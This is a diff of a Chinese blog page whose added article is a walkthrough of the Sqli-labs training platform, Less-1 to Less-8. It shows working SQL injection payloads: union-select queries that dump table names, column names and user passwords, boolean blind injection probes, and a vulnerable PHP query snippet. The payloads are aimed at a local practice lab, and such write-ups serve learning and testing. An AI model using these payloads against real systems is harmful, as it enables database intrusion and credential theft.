@@ -18,7 +18,7 @@
 <meta property="og:site_name" content="Cupid&#39;s Blog">
 <meta property="og:description" content="0x00前言">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2020-01-03T01:51:04.472Z">
+<meta property="og:updated_time" content="2020-02-20T09:17:09.137Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Sqli-labs">
 <meta name="twitter:description" content="0x00前言">
@@ -27,7 +27,7 @@
   
   
   <link rel="stylesheet" href="//at.alicdn.com/t/font_1038733_0xvrvpg9c0r.css">
-  <link rel="stylesheet" href="/css/style.css?v=1580311171387">
+  <link rel="stylesheet" href="/css/style.css?v=1582644554008">
 </head>
 
 <body class="mdui-drawer-body-left">
@@ -51,9 +51,9 @@
         </a>
     </div>
     <div class="nexmoe-count">
-        <div><span>Articles</span>64</div>
+        <div><span>Articles</span>66</div>
         <div><span>Tags</span>0</div>
-        <div><span>Categories</span>5</div>
+        <div><span>Categories</span>6</div>
     </div>
     <ul class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
         
@@ -128,6 +128,13 @@
         
 
         <li class="category-list-item">
+          <a class="category-list-link" href="/categories/代码审计/">代码审计</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
           <a class="category-list-link" href="/categories/密码学/">密码学</a>
           <span class="category-list-count">1</span>
         </li>
@@ -153,7 +160,7 @@
   <div class="nexmoe-widget-wrap">
     <h3 class="nexmoe-widget-title">Archive</h3>
     <div class="nexmoe-widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li></ul>
     </div>
   </div>
 
@@ -178,8 +185,8 @@
     </div>
   <div class="nexmoe-post-meta">
     <a><i class="nexmoefont icon-calendar-fill"></i>2019年12月26日</a>
-    <a><i class="nexmoefont icon-areachart"></i>205 字</a>
-    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 1 分钟</a>
+    <a><i class="nexmoefont icon-areachart"></i>1.2k 字</a>
+    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 5 分钟</a>
     
       <a class="nexmoefont icon-appstore-fill -link" href="/categories/Web漏洞/">Web漏洞</a>
     
@@ -191,6 +198,34 @@
 <h1>0x01Sqli-labs介绍</h1>
 Sqli-libs是一个非常好的SQL注入学习实战平台，涵盖了报错注入、盲注、Update注入、INSert注入、Heather注入、二次注入、绕过WAF等等，是一个比较全面的注入平台，它可以直接部署在本地，下载一个phpstudy即可打开，当然赵总的BUU平台上也有这个平台。
 <h1>0x02刷题开始</h1>
+less1
+id=1时候页面正常加上'页面报错，说明存在字符型的注入，接下来测试字段数量
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=<span class="number">1</span>' order <span class="keyword">by</span> <span class="number">3</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<p>order by 3页面返回正常，4的时候出错，说明字段数目为3个</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">-1</span>' union select <span class="number">1</span>,<span class="number">2</span>,database()--+</span><br></pre></td></tr></table></figure>
+
+<p>查出数据库为security</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">id</span>=-1' union select 1,2,group_concat(table_name) <span class="keyword">from</span> information_schema.tables where <span class="attribute">table_schema</span>=<span class="string">'security'</span>--+</span><br></pre></td></tr></table></figure>
+
+<p>查出表有emails,referers,uagents,users</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">id</span>=-1' union select 1,2,group_concat(column_name) <span class="keyword">from</span> information_schema.columns where <span class="attribute">table_schema</span>=<span class="string">'security'</span>--+</span><br></pre></td></tr></table></figure>
+
+<p>查出字段有:id,email_id,id,referer,ip_address,id,uagent,ip_address,username,id,username,password</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">-1</span>%<span class="number">27</span>%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,<span class="number">2</span>,group_concat(password)%<span class="number">20</span>from%<span class="number">20</span>users--+</span><br></pre></td></tr></table></figure>
+
+<p>查出password字段内容:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin<br>其他的类似就不一一查询了。</p>
+<p>less2<br>less2在加上id=1’后依然报错，但其使用order by 3无需加上’即可正确查询，因而应当为数字型注入，之后查询语句将’去掉与less1一致。就不一一查询了。</p>
+<p>less3<br>在输入id=1’后报错</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; <span class="keyword">check</span> the <span class="keyword">manual</span> that corresponds <span class="keyword">to</span> your MariaDB <span class="keyword">server</span> <span class="keyword">version</span> <span class="keyword">for</span> the <span class="keyword">right</span> syntax <span class="keyword">to</span> <span class="keyword">use</span> near <span class="string">''</span><span class="number">1</span><span class="string">''</span>) <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span><span class="string">' at line 1</span></span><br></pre></td></tr></table></figure>
+
+<p>猜测查询语句应当为select * from users where (“$_GET[‘id’]”) limit 0,1<br>因而这是变式的字符型注入，注入时候改为id=1’) order by 3–+<br>同理改为4时候报错，说明字段数量为4，其他查询语句在less1的基础上加上一个小括号即可。</p>
+<p>less4<br>与less3相比改为了双引号的注入，其他同理<br>其代码</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">'id'</span>];</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span> connectivity </span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span> = <span class="string">'"'</span> . <span class="variable">$id</span> . <span class="string">'"'</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM users WHERE id=($id) LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure>
+
+<p>less5<br>less5看代码会发现输出语句没有输出查询语句，所以使用普通union查询查不出结果，这道题考的是二次查询，意思是select中嵌套select，也就是说这次的sql注入在sql语句利用处就要报错，而不是通过注入语句让代码主动显示出结果，而是通过报错提示中得到敏感信息。当然看了很多博文来看，其主要依靠mysql中的几个函数中的合作报错。</p>
+<p>less8<br>less8GET-Blind-Boolian Based - Single Quotes（布尔型单引号get盲注）<br>当id=1时显示You are in……..加上’语句消失，没有任何报错回显，尝试报错注入依旧You are in,因而这里只能采取盲注，那么盲注分2种，这里告诉了我们是bool盲注，先学几个Bool盲注需要用到的函数：<br>length(str):返回str字符串的长度<br>substr(str,pos,len)将str从pos位置开始截取len长度的字符并进行返回。这里是从1开始的，不是从数组的0开始<br>mid(str,pos,len)同样截取字符串<br>ascii(str)发牛字符串str的最左面字符的ASCII代码值<br>ord(str)同上，返回ASCII码<br>if(a,b,c)a为ture返回b，否则返回C<br>ascii(substr((select database()),1,1))：返回数据库名称的第一个字母,转化为ascii码<br>if(ascii(substr((select database()),1,1))&gt;64, 1, 0)：ascii大于64就返回true，if就返回1，否则返回0<br>2分法猜数据库名字<br>    <a href="http://localhost/sqli-labs/Less-8/?id=1&#39;" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-8/?id=1&#39;</a> and ascii(substr((select database()),1,1)&gt;64 %23 返回正确，大于64<br>    <a href="http://localhost/sqli-labs/Less-8/?id=1&#39;" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-8/?id=1&#39;</a> and ascii(substr((select database()),1,1))&gt;96 %23 返回正确，大于96<br>    <a href="http://localhost/sqli-labs/Less-8/?id=1&#39;" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-8/?id=1&#39;</a> and ascii(substr((select database()),1,1))&lt;123 %23 返回正确，小于123 ，区间在97-122<br>    <a href="http://localhost/sqli-labs/Less-8/?id=1&#39;" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-8/?id=1&#39;</a> and ascii(substr((select database()),1,1))&gt;109 %23 返回正确，大于109，区间在110-122<br>    <a href="http://localhost/sqli-labs/Less-8/?id=1&#39;" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-8/?id=1&#39;</a> and ascii(substr((select database()),1,1))&gt;116 %23 返回错误，所以在110-116之间<br>    <a href="http://localhost/sqli-labs/Less-8/?id=1&#39;" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-8/?id=1&#39;</a> and ascii(substr((select database()),1,1))&gt;112 %23 返回正确，大于112，区间在113-116之间<br>    <a href="http://localhost/sqli-labs/Less-8/?id=1&#39;" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-8/?id=1&#39;</a> and ascii(substr((select database()),1,1))&gt;114 %23 返回正确，大于114，间在115-116之间<br>    <a href="http://localhost/sqli-labs/Less-8/?id=1&#39;" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-8/?id=1&#39;</a> and ascii(substr((select database()),1,1))&gt;115 %23 返回错误，不大于115，即第一个字母的ascii为115，即字母s<br>参考链接：<a href="https://www.jianshu.com/p/1fc798bc7759" target="_blank" rel="noopener">https://www.jianshu.com/p/1fc798bc7759</a></p>
+
   </article>
   
     
@@ -235,7 +270,7 @@ Sqli-libs是一个非常好的SQL注入学习实战平台，涵盖了报错注�
 <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.8/build/highlight.min.js"></script>
 <script>hljs.initHighlightingOnLoad();</script>
 
-<script src="/js/app.js?v=1580311171427"></script>
+<script src="/js/app.js?v=1582644554056"></script>
 <script src="https://cdn.jsdelivr.net/npm/lazysizes@5.1.0/lazysizes.min.js"></script>
 
 
